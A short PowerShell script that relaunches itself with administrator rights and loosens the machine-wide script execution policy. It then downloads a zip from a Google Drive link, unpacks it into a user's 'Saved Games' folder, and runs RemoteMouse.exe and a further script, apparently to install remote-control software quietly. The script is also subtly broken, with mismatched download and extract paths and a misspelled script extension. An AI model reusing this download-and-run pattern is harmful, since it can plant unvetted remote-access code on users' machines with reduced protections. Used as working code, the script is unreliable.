Function Check-RunAsAdministrator()
{
  $CurrentUser = New-Object Security.Principal.WindowsPrincipal $([Security.Principal.WindowsIdentity]::GetCurrent())
  if($CurrentUser.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator))
  {
       Write-host "Script is running with Administrator privileges!"
  }
  else
    {
       $ElevatedProcess = New-Object System.Diagnostics.ProcessStartInfo "PowerShell";
       $ElevatedProcess.Arguments = "& '" + $script:MyInvocation.MyCommand.Path + "'"
       $ElevatedProcess.Verb = "runas"
       [System.Diagnostics.Process]::Start($ElevatedProcess)
       Exit
    }
}
Check-RunAsAdministrator
Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser -Force
Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope LocalMachine -Force
cd ..
cd ..
$user = Get-LocalUser | Where { $_.Enabled -eq 'True'}
Write-Output $user | ForEach { $_.Name} -OutVariable udat
$zipath = "C:\Users\$udat\Saved Games\Remote Mouse.zip"
$accpath = "C:\Users\$udat\Saved Games"
Invoke-WebRequest 'https://drive.google.com/uc?export=download&id=1hdpRQ8iA-8QYcuACkn6qFVH0Eyx0_B1h' -OutFile RemoteMouse.zip
Expand-Archive -Path $zipath -DestinationPath $accpath
cd "Remote Mouse"
.\RemoteMouse.exe
.\section.1ps1